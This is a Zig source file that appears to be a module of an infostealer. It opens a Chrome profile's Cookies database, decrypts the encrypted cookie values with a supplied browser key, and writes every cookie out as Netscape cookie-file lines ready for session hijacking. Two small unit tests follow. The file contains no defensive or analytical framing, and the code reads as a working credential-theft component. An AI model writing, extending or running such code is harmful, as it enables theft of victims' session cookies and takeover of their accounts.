const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");

fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
    const cols = db.getColumnNames(table) catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, name)) return i;
    }
    return null;
}

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: [32]u8) ?[][]const u8 {
    const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Network\\Cookies" }) catch return null;
    defer allocator.free(db_path);

    const mapped = file_io.MappedFile.open(db_path) orelse return null;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return null;
    defer db.deinit();

    const rows = db.readTable("cookies") catch return null;
    defer allocator.free(rows);

    const host_key_idx = columnIndex(&db, "cookies", "host_key", allocator) orelse return null;
    const name_idx = columnIndex(&db, "cookies", "name", allocator) orelse return null;
    const path_idx = columnIndex(&db, "cookies", "path", allocator) orelse return null;
    const enc_val_idx = columnIndex(&db, "cookies", "encrypted_value", allocator) orelse return null;
    const expires_idx = columnIndex(&db, "cookies", "expires_utc", allocator) orelse return null;
    const value_idx = columnIndex(&db, "cookies", "value", allocator);

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(host_key_idx, name_idx, path_idx, enc_val_idx, expires_idx)) continue;

        const host_key = if (row[host_key_idx] != .null) row[host_key_idx].text else "";
        const name = if (row[name_idx] != .null) row[name_idx].text else "";
        const path = if (row[path_idx] != .null) row[path_idx].text else "/";
        const encrypted = if (row[enc_val_idx] != .null and row[enc_val_idx] == .blob) row[enc_val_idx].blob else null;
        const expires_utc = if (row[expires_idx] != .null) row[expires_idx].int else @as(i64, 0);
        const value = if (value_idx) |vi| blk: {
            break :blk if (row.len > vi and row[vi] != .null) row[vi].text else "";
        } else "";

        const cookie_value = if (encrypted) |enc| blk: {
            const decrypted_result = chrome_crypto.decryptPassword(enc, key);
            if (decrypted_result) |d| {
                const copy = allocator.dupe(u8, d) catch break :blk value;
                break :blk copy;
            }
            break :blk value;
        } else value;

        const line = std.fmt.allocPrint(allocator, "{s}\tTRUE\t{s}\tFALSE\t{d}\t{s}\t{s}\n", .{
            host_key, path, expires_utc, name, cookie_value,
        }) catch {
            if (@intFromPtr(cookie_value.ptr) != @intFromPtr(value.ptr)) allocator.free(cookie_value);
            continue;
        };
        if (@intFromPtr(cookie_value.ptr) != @intFromPtr(value.ptr)) allocator.free(cookie_value);
        list.append(line) catch continue;
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator, [_]u8{0} ** 32);
    try std.testing.expect(result == null);
}

test "columnIndex returns null for bad table" {
    try std.testing.expect(columnIndex(undefined, "no_table", "x", std.testing.allocator) == null);
}
